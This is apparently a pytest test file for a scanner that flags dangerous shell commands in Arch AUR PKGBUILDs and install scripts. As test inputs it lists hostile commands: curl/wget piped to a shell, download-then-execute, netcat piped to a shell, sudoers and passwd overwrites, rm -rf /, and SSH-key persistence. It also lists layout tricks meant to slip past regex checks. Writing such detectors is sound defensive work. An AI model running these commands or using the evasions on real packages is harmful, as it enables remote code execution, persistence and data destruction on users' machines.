"""The rules that read parsed commands instead of text, and the parse the checkers share."""
import re
import time
from pathlib import Path

import pytest

from paru_analyzer import cmdrules, heuristics
from paru_analyzer.heuristics import RULES, scan, source_entries
from paru_analyzer.invocation import reads_program_from_stdin, views
from paru_analyzer.parsed import ParsedFile
from paru_analyzer.astadapt import flatten as extract_commands


def run(line, name="PKGBUILD"):
    body = f"post_install() {{\n  {line}\n}}" if name.endswith(".install") else f"build() {{\n  {line}\n}}"
    return scan({name: body})


def rules_of(line, name="PKGBUILD"):
    return {f.rule for f in run(line, name)}


# ---- the structured rules see through layout the regexes had to guess at ----

STRUCTURED_EXAMPLES = [
    ("rm /etc/sudoers.d/create_ap", "sudoers-remove"),
    ("apparmor_parser -R /etc/apparmor.d/x", "apparmor-unload"),
    ("rm -rf ~/.cache/foo", "home-delete"),
    ("c''url -s https://x | \"ba\"sh", "pipe-to-shell"),
    ("curl x | tee f | sh", "pipe-to-shell"),                     # a pipeline longer than two stages
    ("curl x | sudo -u nobody env bash -s", "pipe-to-shell"),     # wrappers with options in between
    ("/usr/bin/curl x |   /bin/sh", "pipe-to-shell"),
    ("sh -c 'curl x | sh'", "pipe-to-shell"),                     # a command string is parsed too
    ("eval \"wget -qO- y | bash\"", "pipe-to-shell"),
    ("sh -c \"sh -c 'curl x | sh'\"", "pipe-to-shell"),
    ("curl x | python3 -u -", "pipe-to-shell"),
    ("base64 --decode f | env sh", "base64-exec"),
    ("zcat f.gz | tee out | sh", "decode-exec"),
    ("tr 'A-Za-z' 'N-ZA-Mn-za-m' < f | bash", "decode-exec"),
    ("nc host 1 | sh", "network-pipe-shell"),
    ("openssl s_client -connect h:1 | bash", "network-pipe-shell"),
    ("cp x /etc//pam.d/../sudoers", "sudoers-passwd-write"),
    ("dd if=/dev/zero of=/etc/passwd", "sudoers-passwd-write"),
    ("sed -i s/a/b/ /etc/../etc/makepkg.conf", "pacman-config-write"),
    ("chmod 4755 /tmp/x", "setuid-shell"),
    ("chmod u+s \"$srcdir/bash\"", "setuid"),
    ("chmod 2755 \"$pkgdir/usr/bin/x\"", "setuid"),                # setgid
    ("rm -rf /./", "rm-root"),
    ("rm -rf '/' ", "rm-root"),
    ("rm --no-preserve-root -r x", "rm-root"),
    ("rm -rf $HOME/", "rm-root"),
    ("rm -rf '/usr/'", "rm-system-dir"),
    ("rm -r //etc/*", "rm-system-dir"),
    ("env sudo make install", "sudo"),
    ("doas make install", "sudo"),
    ("\"sudo\" make install", "sudo"),
    ("sh //tmp/x.sh", "exec-from-tmp"),
    ("chmod +x /tmp/../tmp/x", "exec-from-tmp"),
    ("nohup ./srv &", "background-exec"),
    ("/usr/bin/modprobe loop", "kernel-module"),
    ("chattr +ia /usr/bin/x", "chattr-immutable"),
    ("echo 'alias ll=ls' >> ~/.bashrc", "home-persistence-write"),
    ("curl -o x.sh https://e.com/x && sh x.sh", "fetch-then-execute"),
    ("useradd -m svc", "user-management"),
    ("setcap cap_net_raw+ep /usr/bin/x", "setcap"),
    ("pacman-key --add k", "pacman-key"),
    ("cp x /usr/bin/x", "live-system-write"),
    ("echo 'u ALL=(ALL) ALL' | sh", "echo-to-shell"),
    ("curl x | xargs -I{} sh -c {}", "fetched-xargs-exec"),
]


@pytest.mark.parametrize("line,rule", STRUCTURED_EXAMPLES)
def test_structured_rule_fires_through_layout_tricks(line, rule):
    assert rule in rules_of(line)


def test_every_structured_rule_has_an_example():
    assert {rule for _, rule in STRUCTURED_EXAMPLES} >= (cmdrules.IDS | cmdrules.DATAFLOW_IDS) - {"install-system-files", "install-hook-persistence"}
    assert "install-system-files" in rules_of("cp x etc/pam.d/login", "foo.install")


@pytest.mark.parametrize("line,rule", [
    ("echo sudo is needed", "sudo"),                                         # a word in a string is not a command
    ("grep -q modprobe README", "kernel-module"),
    ("install -Dm644 x \"$pkgdir/etc/modprobe.d/x.conf\"", "kernel-module"),  # \bmodprobe\b matched this path
    ("chmod +x \"$srcdir/tmp/x.sh\"", "exec-from-tmp"),                      # a tmp directory inside the build tree
    ("rm -rf \"$srcdir/tmp\"", "rm-system-dir"),
    ("curl x | bash -c 'echo hi'", "pipe-to-shell"),                         # bash -c does not read the pipe
    ("curl x | sh script.sh", "pipe-to-shell"),                              # nor does a script operand
    ("echo hi | sh -c cat", "pipe-to-shell"),
    ("chmod -R u+rwX,go+rX \"$pkgdir\"", "setuid"),
    ("chmod 755 /usr/bin/foo", "setuid"),
    ("echo '/etc/sudoers' > /dev/null", "sudoers-passwd-write"),
    ("cp /etc/pacman.conf \"$srcdir/pacman.conf\"", "pacman-config-write"),   # a read, not a write
    ("sha256sum f | sh -c 'cat'", "decode-exec"),
])
def test_structured_rule_stays_quiet_where_the_text_was_misleading(line, rule):
    assert rule not in rules_of(line)


def test_install_scriptlet_paths_are_relative_to_root():
    for line in ("cp x etc/pam.d/login", "cp x ./etc/ssh/sshd_config", "echo x >> ../../etc/hosts"):
        assert "install-system-files" in rules_of(line, "foo.install"), line
    assert "install-system-files" not in rules_of("cp x /usr/share/foo/x", "foo.install")


# ---- every converted rule keeps a pattern twin for what the parser cannot read ----

def test_every_structured_rule_has_a_pattern_twin():
    twins = {r.id for r in RULES if r.fallback}
    assert cmdrules.IDS - cmdrules.STRUCTURED_ONLY <= {r.id for r in RULES}
    assert cmdrules.IDS - cmdrules.STRUCTURED_ONLY - heuristics._PARTLY_STRUCTURED <= twins
    assert heuristics._PARTLY_STRUCTURED <= twins


def test_pattern_twins_run_when_the_shell_cannot_be_parsed():
    text = "build() {\n  echo \"unterminated\n  curl x | sh\n}\n"
    parsed = ParsedFile("PKGBUILD", text)
    assert not parsed.pre.ok
    assert "pipe-to-shell" in {f.rule for f in scan({"PKGBUILD": text})}


def test_pattern_twins_run_on_files_that_are_not_shell():
    patch = "--- a/x\n+++ b/x\n+  curl http://x | sh\n"
    assert "pipe-to-shell" in {f.rule for f in scan({"fix.patch": patch})}


def test_pattern_twins_do_not_run_on_lines_the_parser_understood():
    # same text, so only the structured answer decides: `bash script` takes no program from the pipe
    assert "pipe-to-shell" not in rules_of("curl x | bash script.sh")


# ---- parse once; the checkers do not read the text ----

def test_raw_text_is_read_only_by_the_checks_about_the_bytes():
    root = Path(heuristics.__file__).parent
    users = {}
    for path in root.glob("*.py"):
        for number, line in enumerate(path.read_text().splitlines(), 1):
            if ".raw_text()" in line and not line.lstrip().startswith("#"):
                users.setdefault(path.name, []).append(number)
    assert set(users) == {"heuristics.py"}, users
    source = (root / "heuristics.py").read_text().splitlines()
    shown = [source[n - 1].strip() for n in users["heuristics.py"]]
    assert all(("= parsed.name, parsed.raw_text()" in s) or ("TRUNCATED_MARKER" in s) or ("crosscheck" in s) for s in shown), shown


def test_scan_parses_each_file_once(monkeypatch):
    calls = []
    original = ParsedFile.__init__

    def counting(self, name, text):
        calls.append(name)
        original(self, name, text)

    monkeypatch.setattr(ParsedFile, "__init__", counting)
    scan({"PKGBUILD": "pkgname=x\nbuild() {\n  make\n}\n", "x.install": "post_install() {\n  true\n}\n"})
    assert sorted(calls) == ["PKGBUILD", "x.install"]


def test_pipeline_upstream_and_stdin_reader():
    parsed = ParsedFile("PKGBUILD", "build() {\n  curl x | tee f | sudo bash -s\n}\n")
    receivers = [pc for pc in parsed.commands if pc.command.name == "sudo"]
    assert [c.name for c in receivers[0].upstream()] == ["tee", "curl"]
    assert reads_program_from_stdin("bash", ["-s", "--", "arg"])
    assert not reads_program_from_stdin("bash", ["-lc", "cmd"])
    assert not reads_program_from_stdin("python3", ["-m", "http.server"])
    assert reads_program_from_stdin("python3", ["-"])


def test_wrappers_unwrap_to_the_program_that_runs():
    command = extract_commands("sudo -u nobody nice -n 5 timeout 10 env A=1 bash -s")[0][0]
    assert [v.name for v in views(command)] == ["sudo", "nice", "timeout", "env", "bash"]


# ---- line numbers come from the parse, not from searching the text ----

def test_multiline_source_items_report_their_own_lines():
    text = ('pkgname=x\nsource=("a.tar.gz::https://one.example/a.tar.gz"\n'
            '        "b.tar.gz::https://two.example/b.tar.gz"\n        "https://three.example/c.tar.gz")\n'
            "sha256sums=('SKIP' 'SKIP' 'SKIP')\n")
    assert [(e.url.split("/")[2], e.line) for e in source_entries(text)] == [
        ("one.example", 2), ("two.example", 3), ("three.example", 4)]
    lines = {f.message.split()[-1]: f.line for f in scan({"PKGBUILD": text}) if f.rule == "external-source"}
    assert lines == {"https://one.example/a.tar.gz": 2, "https://two.example/b.tar.gz": 3, "https://three.example/c.tar.gz": 4}


def test_a_repeated_url_is_reported_on_the_line_it_is_on():
    text = "source=('https://e.com/a'\n        'https://e.com/a')\nsha256sums=('1' '1')\n"
    assert [e.line for e in source_entries(text)] == [1, 2]


def test_impersonation_name_reports_the_assignment_line():
    findings = scan({"PKGBUILD": "# header\n\npkgname=firefox-patch\n"})
    assert [f.line for f in findings if f.rule == "impersonation-name"] == [3]


# ---- long lines are bounded ----

def test_long_lines_are_bounded_and_reported():
    for filler in ("echo >a ", "curl x | ", "fsockopen ", "tar ~ "):
        text = "build() {\n  " + filler * (60000 // len(filler)) + "\n}\n"
        start = time.time()
        found = {f.rule for f in scan({"PKGBUILD": text})}
        assert time.time() - start < 5, filler
        assert "overlong-line" in found, filler


def test_padding_does_not_hide_a_pipe_from_the_parsed_rule():
    text = "build() {\n  curl x" + " " * 60000 + "| sh\n}\n"
    start = time.time()
    findings = scan({"PKGBUILD": text})
    assert time.time() - start < 5
    assert any(f.rule == "pipe-to-shell" and f.severity == "warning" for f in findings)


def test_every_pattern_with_an_open_gap_is_marked_risky():
    for rule in RULES:
        assert rule.risky == bool(re.search(r"\[\^[^\]]*\][*+]|\.[*+]|\\S[*+]", rule.pattern.pattern)), rule.id


# ---- rules the text-based patterns could not express ----

@pytest.mark.parametrize("line", [
    "curl -o x.sh https://e.com/x && sh x.sh",
    "wget -qO inst https://e.com/i; ./inst",                       # option cluster, then a relative command
    "curl -sL https://e.com/i.sh > i.sh; bash i.sh",               # a redirect names the file
    "wget https://e.com/i.sh; bash i.sh",                          # the file name comes from the URL
    "curl -O https://e.com/i.sh; . ./i.sh",
    "curl -sLo x https://e/x && chmod +x x && ./x",
    "sudo curl -o /tmp/x https://e/x; sh /tmp/x",
])
def test_a_downloaded_file_that_is_then_executed_is_danger(line):
    hits = [f for f in run(line) if f.rule == "fetch-then-execute"]
    assert hits and hits[0].severity == "warning"
    assert "fetched on line" in hits[0].message


@pytest.mark.parametrize("line", [
    "curl -o f.tgz https://e.com/f.tgz; tar xf f.tgz",
    "curl -o x https://e/x; install -Dm755 x \"$pkgdir/usr/bin/x\"",   # installed, never run
    "curl -o x https://e/x; sh other.sh",                              # a different file
    "curl -o x https://e/x; bash -c 'echo x'",
])
def test_downloading_without_running_the_file_is_not_fetch_then_execute(line):
    assert "fetch-then-execute" not in rules_of(line)


@pytest.mark.parametrize("line", [
    "echo 'alias ll=ls' >> ~/.bashrc",
    "install -Dm644 a ~/.config/autostart/a.desktop",
    "cp a ${HOME}/.config/systemd/user/a.service",
    "echo key >> /root/.ssh/authorized_keys",
    "tee -a /home/bob/.zshrc <<< x",
])
def test_a_build_that_writes_a_file_the_session_loads_is_danger(line):
    hits = [f for f in run(line) if f.rule == "home-persistence-write"]
    assert hits and hits[0].severity == "warning"


@pytest.mark.parametrize("line", [
    "cp x \"$pkgdir/etc/skel/.bashrc\"",
    "install -Dm644 a \"$pkgdir/usr/share/foo/.profile\"",
    "grep -q x ~/.bashrc",                                             # a read
    "echo x >> \"$srcdir/.bashrc\"",
])
def test_writing_a_rc_file_inside_the_build_tree_is_fine(line):
    assert "home-persistence-write" not in rules_of(line)


def test_install_hook_persistence_keeps_its_own_caution():
    assert "home-persistence-write" not in rules_of("echo x >> ~/.bashrc", "foo.install")
    assert "install-hook-persistence" in rules_of("echo x >> ~/.bashrc", "foo.install")


def test_long_unparseable_lines_are_read_in_windows():
    broken = "build() {\n  echo \"unterminated\n  "
    near = scan({"PKGBUILD": broken + "curl x |" + " " * 300 + "sh" + " ;" * 1500 + "\n}\n"})
    assert any(f.rule == "pipe-to-shell" and f.severity == "warning" for f in near)
    start = time.time()
    scan({"PKGBUILD": broken + "curl x | " * 6000 + "cat\n}\n"})
    assert time.time() - start < 5


# ---- pipelines are followed in linear time, and across groups ----

@pytest.mark.parametrize("filler", ["curl x | sh | ", "echo a | sh | ", "cat <(curl x) | sh | ", "sh <<< $(curl x) | ", "curl x | cat | "])
def test_long_pipelines_are_linear(filler):
    text = "build() {\n  " + filler * (60000 // len(filler)) + "\n}\n"
    start = time.time()
    scan({"PKGBUILD": text})
    assert time.time() - start < 5, filler


def test_a_long_pipeline_still_reaches_its_first_stage():
    line = "curl x | " + "cat | " * 500 + "sh"
    assert "pipe-to-shell" in rules_of(line)


def test_upstream_tags_match_the_upstream_list():
    from paru_analyzer.cmdrules import command_tags
    parsed = ParsedFile("PKGBUILD", "build() {\n  curl x | tee f | base64 -d | sh\n  echo a | sh\n}\n")
    for pc in parsed.commands:
        expected = frozenset().union(*(command_tags(c) for c in pc.upstream()))
        assert pc.upstream_tags(command_tags) == expected, pc.command


@pytest.mark.parametrize("text,upstream_of_sh", [
    ("(curl x) | sh", ["curl"]),
    ("{ curl x; } | sh", ["curl"]),
    ("(cd y; curl x) | sh", ["curl", "cd"]),
    ("{ curl x; echo; } | sh", ["echo", "curl"]),
    ("curl x | (cd y; sh)", ["curl"]),             # `cd` shares sh's stage: it does not feed it
    ("curl x | { cd y; sh; }", ["curl"]),
])
def test_groups_do_not_cut_the_pipeline(text, upstream_of_sh):
    parsed = ParsedFile("PKGBUILD", f"build() {{\n  {text}\n}}\n")
    sh = [pc for pc in parsed.commands if pc.command.name == "sh"][0]
    assert sorted(c.name for c in sh.upstream()) == sorted(upstream_of_sh)


# ---- variables the file assigns once ----

def test_stable_variables_drop_names_assigned_twice():
    parsed = ParsedFile("PKGBUILD", "d=/etc\nd=$pkgdir/etc\ne=/usr\nbuild() {\n  cp x $e/y\n}\n")
    assert parsed.stable_variables == {"e": "/usr"}


def test_a_path_through_a_single_assignment_is_resolved():
    assert "sudoers-passwd-write" in rules_of("d=/etc/sudoers.d; echo x > \"${d}/a\"")
    assert not {"live-system-write", "sudoers-passwd-write"} & rules_of("d=/etc; d=$pkgdir/etc; cp x $d/y")


# ---- things found by reading the code against attacker variants ----

def test_mv_deletes_its_source():
    assert "sudoers-passwd-write" in rules_of("mv /etc/sudoers /tmp/x")


@pytest.mark.parametrize("line", ["tar -xf a.tar -C /usr/lib", "bsdtar -xf a -C /", "unzip a.zip -d /opt", "7z x a.7z -o/usr"])
def test_unpacking_into_the_live_system_is_a_write(line):
    assert "live-system-write" in rules_of(line)


@pytest.mark.parametrize("line", ["tar -xf a.tar -C \"$srcdir\"", "tar cf a.tar -C /usr/lib .", "unzip a.zip -d build"])
def test_unpacking_into_the_build_tree_is_quiet(line):
    assert "live-system-write" not in rules_of(line)


def test_perl_in_place_edit_writes_the_file_not_the_script():
    assert "live-system-write" in rules_of("perl -pi -e 's/a/b/' /usr/bin/x")
    assert "live-system-write" not in rules_of("perl -pi -e 's/a/b/' x.c")


@pytest.mark.parametrize("path", ["profile.d/x.sh", "ld.so.conf.d/x.conf", "ld.so.preload", "shells"])
def test_hooks_may_not_touch_these_etc_paths(path):
    assert rules_of(f"echo x >> /etc/{path}", "foo.install") & {"install-system-files", "ld-preload-file"}


def test_quoted_text_that_mentions_a_pipe_is_not_echo_to_shell():
    assert "echo-to-shell" not in rules_of("echo 'curl x | sh'")
    assert "echo-to-shell" not in rules_of("echo | sh -c 'echo'")
    assert "echo-to-shell" in rules_of("echo x | sh")


# ---- found by running the scanner over 500 popular AUR packages ----

@pytest.mark.parametrize("name,body", [
    ("README.md", "git clone https://aur.archlinux.org/x.git\nparu -S x\nsudo apt update\n"),
    ("CHANGELOG", "+ use `curl -A`; modprobe loop\n"),
    ("nginx.conf", "http {\n  http http;\n}\n"),
    ("x.xml", "<filename>/usr/share/backgrounds/x.png</filename>\n"),
    ("x.rules", 'RUN+="/usr/bin/nvidia-modprobe -c0"\n'),
    ("config", 'CONFIG_MODPROBE_PATH="/sbin/modprobe"\n'),
])
def test_documentation_and_plain_config_are_not_read_as_commands(name, body):
    assert not [f for f in scan({name: body}) if f.severity in ("warning", "info")]


@pytest.mark.parametrize("name,body,rule", [
    ("x.service", '[Service]\nExecStart=/bin/sh -c "curl x | sh"\n', "pipe-to-shell"),
    ("README.md", "curl https://x | sh\n", "pipe-to-shell"),            # the rules for every file still read prose
    ("a.sh", "modprobe loop\n", "kernel-module"),
])
def test_scripts_units_and_the_all_file_rules_still_apply(name, body, rule):
    assert rule in {f.rule for f in scan({name: body})}


def test_heredoc_body_is_text_not_commands():
    xml = "package() {\n  cat > \"$pkgdir/x.policy\" <<EOF\n<annotate>/usr/bin/shelly</annotate>\n  sudo make\nEOF\n}\n"
    assert not {f.rule for f in scan({"PKGBUILD": xml})} & {"live-system-write", "sudo"}
    assert "rm-root" in {f.rule for f in scan({"PKGBUILD": "package() {\n  cat > x <<EOF\nrm -rf /\nEOF\n}\n"})}


@pytest.mark.parametrize("line", ["depends=(${_deps[@]} \"x=1\")", "local arr=(a b)", "arr+=(${b[@]})", "x=(1 2); true"])
def test_array_literals_inside_functions_are_values_not_commands(line):
    rules = {f.rule for f in scan({"PKGBUILD": f"package() {{\n  {line}\n}}\n"})}
    assert not rules & {"dynamic-command", "unknown-command"}


def test_neighbouring_punctuation_is_split_into_operators():
    from paru_analyzer.astadapt import flatten as extract_commands
    assert [c.name for c in extract_commands("a=(1 2); make")[0]] == ["make"]
    assert [(c.name, c.piped) for c in extract_commands("(ls)|tee f")[0]] == [("ls", False), ("tee", True)]


def test_deleting_one_sudoers_file_is_reported_below_writing_one():
    assert rules_of("rm /etc/sudoers.d/create_ap", "foo.install") >= {"sudoers-remove"}
    assert "sudoers-passwd-write" not in rules_of("rm /etc/sudoers.d/create_ap", "foo.install")
    for body in ("rm -f /etc/sudoers.d/*", "rm /etc/sudoers", "rm -r /etc/sudoers.d", "echo x > /etc/sudoers.d/x"):
        assert "sudoers-passwd-write" in rules_of(body, "foo.install"), body
        assert "sudoers-remove" not in rules_of(body, "foo.install"), body
